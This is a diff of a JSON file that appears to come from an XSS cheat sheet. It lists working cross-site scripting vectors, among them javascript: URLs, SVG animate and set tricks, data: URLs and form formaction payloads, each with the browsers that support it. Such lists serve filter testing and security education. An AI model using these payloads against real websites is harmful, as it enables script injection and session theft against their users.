@@ -1,280 +1,142 @@
 [
-    {
-        "description": "Iframe src attribute JavaScript protocol",
-        "code": "<iframe src=\"javascript:alert(1)\">",
-        "browsers": [
-            "chrome",
-            "firefox",        
-            "safari"
-        ]
-    },
-    {
-        "description": "Object data attribute with JavaScript protocol",
-        "code": "<object data=\"javascript:alert(1)\">",
-        "browsers": [
-            "firefox"
-        ]
-    },
-    {
-        "description": "Embed src attribute with JavaScript protocol",
-        "code": "<embed src=\"javascript:alert(1)\">",
-        "browsers": [
-            "firefox"
-        ]
-    },
-    {
-        "description": "A standard JavaScript protocol",
-        "code": "<a href=\"javascript:alert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",        
-            "safari"
-        ]
-    },
-    {
-        "description": "The protocol is not case sensitive",
-        "code": "<a href=\"JaVaScript:alert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",        
-            "safari"
-        ]
-    },
-    {
-        "description": "Characters \\x01-\\x20 are allowed before the protocol",
-        "code": "<a href=\" \tjavascript:alert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",        
-            "safari"
-        ]
-    },
-    {
-        "description": "Characters \\x09,\\x0a,\\x0d are allowed inside the protocol",
-        "code": "<a href=\"javas\tcript:alert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Characters \\x09,\\x0a,\\x0d are allowed after protocol name before the colon",
-        "code": "<a href=\"javascript\n:alert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Xlink namespace inside SVG with JavaScript protocol",
-        "code": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS<\/text><\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "SVG animate tag using values",
-        "code": "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "SVG animate tag using to",
-        "code": "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "SVG set tag",
-        "code": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) \/><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Data protocol inside script src",
-        "code": "<script src=\"data:text\/javascript,alert(1)\"><\/script>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "SVG script href attribute without closing script tag",
-        "code": "<svg><script href=\"data:text\/javascript,alert(1)\" \/>",
-        "browsers": [
-            "firefox"
-        ]
-    },
-    {
-        "description": "SVG use element Chrome\/Firefox",
-        "code": "<svg><use href=\"data:image\/svg+xml,<svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg' xmlns:xlink='http:\/\/www.w3.org\/1999\/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' \/><\/a><\/svg>#x\"><\/use><\/svg>",
-        "browsers": [
-            "chrome",
-            "firefox"
-        ]
-    },
-    {
-        "description": "Import statement with data URL",
-        "code": "<script>import('data:text\/javascript,alert(1)')<\/script>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Base tag with JavaScript protocol rewriting relative URLS",
-        "code": "<base href=\"javascript:\/a\/-alert(1)\/\/\/\/\/\/\/\"><a href=..\/lol\/safari.html>test<\/a>",
-        "browsers": [
-            "safari"
-        ]
-    },
-    {
-        "description": "MathML makes any tag clickable",
-        "code": "<math><x href=\"javascript:alert(1)\">blah",
-        "browsers": [
-            "firefox"
-        ]
-    },
-    {
-        "description": "Button and formaction",
-        "code": "<form><button formaction=javascript:alert(1)>XSS",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Input and formaction",
-        "code": "<form><input type=submit formaction=javascript:alert(1) value=XSS>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Form and action",
-        "code": "<form action=javascript:alert(1)><input type=submit value=XSS>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Animate tag with keytimes and multiple values",
-        "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS<\/text><\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "JavaScript protocol with new line",
-        "code": "<a href=\"javascript:\/\/%0aalert(1)\">XSS<\/a>",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "safari"
-        ]
-    },
-    {
-        "description": "Data URL with use element and base64 encoded",
-        "code": "<svg><use href=\"data:image\/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" \/><\/svg>",
-        "browsers": [
-            "chrome",
-            "firefox"
-        ]
-    },
-    {
-        "description": "Data URL with use element",
-        "code": "<svg><use href=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" />",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge"
-        ]
-    },
-    {
-        "description": "Animate tag with auto executing use element",
-        "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" \/><use id=x \/>",
-        "browsers": [
-            "chrome",
-            "firefox"
-        ]
-    },
-    {
-        "description": "Embed supports code attribute",
-        "code": "<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>",
-        "browsers": [
-            "chrome"
-        ]
-    },
-    {
-        "description": "Object tag supports param url",
-        "code": "<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>",
-        "browsers": [
-            "chrome"
-        ]
-    },
-    {
-        "description": "Object tag supports param code",
-        "code": "<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>",
-        "browsers": [
-            "chrome"        
-        ]
-    },
-    {
-        "description": "Object tag supports param movie",
-        "code": "<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>",
-        "browsers": [
-            "chrome"        
-        ]
-    },
-    {
-        "description": "Object tag supports param src",
-        "code": "<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>",
-        "browsers": [
-            "chrome"        
-        ]
-    },
-    {
-        "description": "Assignable protocol with location",
-        "code": "<script>location.protocol='javascript'<\/script>",
-        "url": "https:\/\/portswigger-labs.net\/xss\/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C\/script%3E#%0aalert%281%29\/\/",
-        "browsers": [
-            "chrome","safari"        
-        ]
-    },
-    {
-        "description": "Assignable protocol with anchor",
-        "code": "<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test<\/a>",
-        "browsers": [
-            "chrome","safari"       
-        ]
-    },
-    {
-        "description": "Navigation navigate method",
-        "code": "<script>navigation.navigate('javascript:alert(1)')</script>",
-        "browsers": [
-            "chrome" 
-        ]
-    }        
+  {
+    "description": "Iframe src attribute JavaScript protocol",
+    "code": "<iframe src=\"javascript:alert(1)\">",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Object data attribute with JavaScript protocol",
+    "code": "<object data=\"javascript:alert(1)\">",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Embed src attribute with JavaScript protocol",
+    "code": "<embed src=\"javascript:alert(1)\">",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "A standard JavaScript protocol",
+    "code": "<a href=\"javascript:alert(1)\">XSS</a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "The protocol is not case sensitive",
+    "code": "<a href=\"JaVaScript:alert(1)\">XSS</a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Characters \\x01-\\x20 are allowed before the protocol",
+    "code": "<a href=\" \tjavascript:alert(1)\">XSS</a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Characters \\x09,\\x0a,\\x0d are allowed inside the protocol",
+    "code": "<a href=\"javas\tcript:alert(1)\">XSS</a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Characters \\x09,\\x0a,\\x0d are allowed after protocol name before the colon",
+    "code": "<a href=\"javascript\n:alert(1)\">XSS</a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Xlink namespace inside SVG with JavaScript protocol",
+    "code": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "SVG animate tag using values",
+    "code": "<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "SVG animate tag using to",
+    "code": "<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "SVG set tag",
+    "code": "<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Data protocol inside script src",
+    "code": "<script src=\"data:text/javascript,alert(1)\"></script>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "SVG script href attribute without closing script tag",
+    "code": "<svg><script href=\"data:text/javascript,alert(1)\" />",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "SVG use element Chrome/Firefox",
+    "code": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
+    "browsers": ["chrome", "firefox"]
+  },
+  {
+    "description": "Import statement with data URL",
+    "code": "<script>import('data:text/javascript,alert(1)')</script>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "MathML makes any tag clickable",
+    "code": "<math><x href=\"javascript:alert(1)\">blah",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Button and formaction",
+    "code": "<form><button formaction=javascript:alert(1)>XSS",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Input and formaction",
+    "code": "<form><input type=submit formaction=javascript:alert(1) value=XSS>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Form and action",
+    "code": "<form action=javascript:alert(1)><input type=submit value=XSS>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Animate tag with keytimes and multiple values",
+    "code": "<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>",
+    "browsers": ["chrome", "firefox", "safari"]
+  },
+  {
+    "description": "Animate tag with auto executing use element",
+    "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />",
+    "browsers": ["chrome", "firefox"]
+  },
+  {
+    "description": "Embed supports code attribute",
+    "code": "<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Object tag supports param url",
+    "code": "<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Object tag supports param code",
+    "code": "<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Object tag supports param movie",
+    "code": "<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Object tag supports param src",
+    "code": "<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>",
+    "browsers": ["chrome"]
+  },
+  {
+    "description": "Navigation navigate method",
+    "code": "<script>navigation.navigate('javascript:alert(1)')</script>",
+    "browsers": ["chrome"]
+  }
 ]
